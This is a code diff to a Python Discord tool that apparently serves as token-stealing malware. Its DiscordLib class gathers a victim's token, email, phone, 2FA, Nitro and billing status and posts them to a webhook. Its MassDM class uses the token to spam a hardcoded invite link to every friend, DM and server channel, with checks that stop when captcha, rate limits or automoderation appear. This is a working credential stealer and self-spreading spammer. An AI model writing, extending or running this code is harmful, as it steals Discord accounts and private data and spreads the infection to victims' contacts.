@@ -10,8 +10,9 @@ import asyncio
 from colorama import Fore
 from colorama import Style
 from datetime import datetime
+import aiohttp
 
-class Dump:
+class DiscordLib:
     def get_headers(self, token, content_type="application/json"):
         headers = {
         "Content-Type": content_type,
@@ -22,38 +23,38 @@ class Dump:
         return headers
     
     def get_details(self, token):
-        data = requests.get('https://discordapp.com/api/v6/users/@me', headers=self.get_headers(token))
-        return json.loads(data.text)
+        req = requests.get('https://discordapp.com/api/v6/users/@me', headers=self.get_headers(token)).json()
+        if not req['phone']:
+            req['phone'] = False
+
+        return req
                
     def get_relationships(self, token):
-        data = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=self.get_headers(token))
-        return len(json.loads(data.text))
+        req = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=self.get_headers(token)).json()
+        return len(req)
     
     def get_guilds(self, token):
-        data = requests.get("https://discordapp.com/api/v6/users/@me/guilds", headers=self.get_headers(token))
+        req = requests.get("https://discordapp.com/api/v6/users/@me/guilds", headers=self.get_headers(token)).json()
 
-        return json.loads(data.text)
+        return req
         
     def get_payment(self, token):
-        data = requests.get("https://discordapp.com/api/users/@me/billing/payment-sources", headers=self.get_headers(token))
+        req = requests.get("https://discordapp.com/api/users/@me/billing/payment-sources", headers=self.get_headers(token)).json()
         #disord just returns an empty array if no billing
-        data2 = len(json.loads(data.text))
-        return bool(data2)
+        return bool(len(req))
 
-
-    
-
-    
-    
     def generate_embed(self, token):
         details = self.get_details(token)
-        NITRO = False
-        PHONE = details['phone']
-        if not PHONE:
-            PHONE = False
+
             
-        if details["flags"]:
-            NITRO = True
+        if "premium_type" in details:
+            if details['premium_type'] == 1:
+                nitro = "Classic"
+            elif details['premium_type'] == 2:
+                nitro = True
+        else:
+            nitro = False
+            
             
         guilds = self.get_guilds(token)
         numGuilds = 0
@@ -65,9 +66,9 @@ class Dump:
         embed.set_author(name=f"{details['username']}#{details['discriminator']}:{details['id']}", icon_url=f"https://cdn.discordapp.com/avatars/{details['id']}/{details['avatar']}.webp?size=128")
         embed.add_embed_field(name='Token',         value=token, inline=False)
         embed.add_embed_field(name='Email',         value=details['email'], inline=False)
-        embed.add_embed_field(name='Phone',         value=PHONE, inline=False)
+        embed.add_embed_field(name='Phone',         value=details['phone'], inline=False)
         embed.add_embed_field(name='2FA',           value=details["mfa_enabled"])
-        embed.add_embed_field(name='Nitro',         value=NITRO)
+        embed.add_embed_field(name='Nitro',         value=nitro)
         embed.add_embed_field(name='Billing',       value=self.get_payment(token))
         embed.add_embed_field(name='Relationships', value=self.get_relationships(token))
         embed.add_embed_field(name='Guilds',        value=len(guilds))
@@ -80,15 +81,10 @@ class Dump:
         
         webhook.add_embed(self.generate_embed(token))
         try:
-            response = webhook.execute()
+            webhook.execute()
         except Exception:
             print('Failed to send webhook')
             
-    def open_dm(self, token, recipient):
-        payload = json.dumps({"recipients": [recipient]})
-        
-        data = requests.post("https://discord.com/api/v9/users/@me/channels", headers=self.get_headers, data=payload)
-        return json.loads(data.text)['id']
     
 
 
@@ -97,6 +93,8 @@ class MassDM:
         self.token = token
         self.headers = await self.get_headers(token)
         self.name = name
+        self.loop = asyncio.get_running_loop()
+
 
     async def get_headers(self, token, content_type="application/json"):
         headers = {
@@ -108,93 +106,136 @@ class MassDM:
         return headers
     
     async def get_guilds(self):
-        data = requests.get("https://discordapp.com/api/v6/users/@me/guilds", headers=self.headers)
+        async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/guilds", headers=self.headers) as resp:
+            return await resp.json()
 
-        return (json.loads(data.text))
-    
     async def get_guild_channels(self, guild_id):
-        data = requests.get(f"https://discordapp.com/api/guilds/{guild_id}/channels", headers=self.headers)
-        return (json.loads(data.text))
+        async with aiohttp.request("GET", f"https://discordapp.com/api/guilds/{guild_id}/channels", headers=self.headers) as resp:
+            return await resp.json()
+
 
     async def get_dms(self):
-        data = requests.get(f"https://discord.com/api/v8/users/@me/channels", headers=self.headers)
-        return (json.loads(data.text))
+        async with aiohttp.request("GET", f"https://discord.com/api/v8/users/@me/channels", headers=self.headers) as resp:
+            return await resp.json()
+
 
     async def get_relationships(self):
-        data = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=self.headers)
-        return json.loads(data.text)
+        async with aiohttp.request("GET", f"https://discordapp.com/api/v6/users/@me/relationships", headers=self.headers) as resp:
+            return await resp.json()
+
 
     
     async def message_channel(self, channel_id):
         while True:
-            body = {
-                "content": config['auto_spread']['message']
+            payload = {
+                "content": "https://discord.gg/BNP7fkyYMu"
             }
-            req = requests.post(f'https://discordapp.com/api/channels/{channel_id}/messages', headers=self.headers, json=body)
-            data = json.loads(req.text)
-            print(data)
-            if req.status_code == 401:
-                break
-        
-            if req.status_code == 403:
-                break
+            async with aiohttp.request("POST", f"https://discordapp.com/api/channels/{channel_id}/messages", headers=self.headers, json=payload) as resp:
 
-            if 'retry_after' in data:
-                print(data['retry_after']/1000, " seconds")
-                await asyncio.sleep(data['retry_after']/1000)
-
-
-            if 'code' in data:
-                if data['code'] == 50007:
+                data = await resp.json()
+                print(data)
+                if resp.status == 401: #
                     break
             
-            if 'Missing Access' in data:
-                break
-            
-            if 'id' in data:
-                break
+                if resp.status == 403:
+                    break
+
+                if 'You need to verify your account in order to perform this action.' in data:
+                    return 'locked'
+
+                if 'captcha_key' in data:
+                    return "captcha"
+
+                if 'retry_after' in data:
+                    if data['retry_after']/1000 > 10:
+                        return "rate_limit"
+                    print(data['retry_after']/1000, " seconds")
+                    await asyncio.sleep(data['retry_after']/1000)
+
+                if 'Message was blocked by automatic moderation' in data:
+                    return 'moderation'
+                if 'code' in data:
+                    if data['code'] == 50007:
+                        break
+                
+                if 'Missing Access' in data:
+                    break
+                
+                if 'id' in data:
+                    break
                 
 
 
     async def open_dm(self, recipient):
-        payload = json.dumps({"recipients": [recipient]}) #[] because its an array just only 1 element, this endpoint designed to support multiple people
-        
-        data = requests.post("https://discord.com/api/users/@me/channels", headers=self.headers, data=payload)
-        return json.loads(data.text)['id']
+        payload = {"recipients": [recipient]} #[] because its an array just only 1 element, this endpoint designed to support multiple people
+        async with aiohttp.request("POST", f"https://discord.com/api/users/@me/channels", headers=self.headers, json=payload) as resp:
+            data = await resp.json()
+            return data['id']
     
     async def close_dm(self, dm_id):
-        data = requests.delete(f"https://discord.com/api/v8/channels/{dm_id}", headers=self.headers)
+        async with aiohttp.request("DELETE", f"https://discord.com/api/v8/channels/{dm_id}", headers=self.headers):
+            return
 
     async def message_friends(self):
         for relationship in await self.get_relationships():
+            if not 'type' in relationship: #check if any relationships
+                return
+
             if relationship['type'] == 1:
                 dm_id = await self.open_dm(relationship['id'])
-                # dm_id = self.message_channel(dm_id)
+                resp = await self.message_channel(dm_id)
+                if resp == "captcha":
+                    return
+                if resp == "rate_limit":
+                    return
+                if resp == "locked":
+                    return
+                if resp == "moderation":
+                    return
                 await self.close_dm(dm_id)
                 print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [FRIEND:{relationship["user"]["username"]}#{relationship["user"]["discriminator"]}]')
 
-            print('Done messaging friends')
 
     
     async def message_dms(self):
         for dm in await self.get_dms():
-            await self.message_channel(dm['id'])
-            await self.close_dm(dm['id'])
-            print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [DM:{dm["recipients"]}]')
+            if not 'id' in dm: # check if any dms
+                return
 
-        print('Done messaging dms')
+            resp = await self.message_channel(dm['id'])
+            if resp == "captcha":
+                return
+            if resp == "rate_limit":
+                return
+            if resp == "locked":
+                return
+            if resp == "moderation":
+                return
+            await self.close_dm(dm['id'])
+            print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [DM:{len(dm["recipients"])}]')
+
 
 
     async def message_guilds(self):
         for guild in await self.get_guilds():
+            if not 'id' in guild: #check if any guilds
+                return
+
             for channel in await self.get_guild_channels(guild['id']):
+                if not 'type' in channel: #check if any channels
+                    return
+
                 if channel['type'] == 0:
-                    await self.message_channel(channel['id'])
+                    resp = await self.message_channel(channel['id'])
+                    if resp == "captcha":
+                        return
+                    if resp == "rate_limit":
+                        return
+                    if resp == "locked":
+                        return
+                    if resp == "moderation":
+                        return
                     print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [GUILD:{guild["name"]}] [CHANNEL:{channel["name"]}]')
-
-        print('Done messaging guilds')
-
-
 
     
 
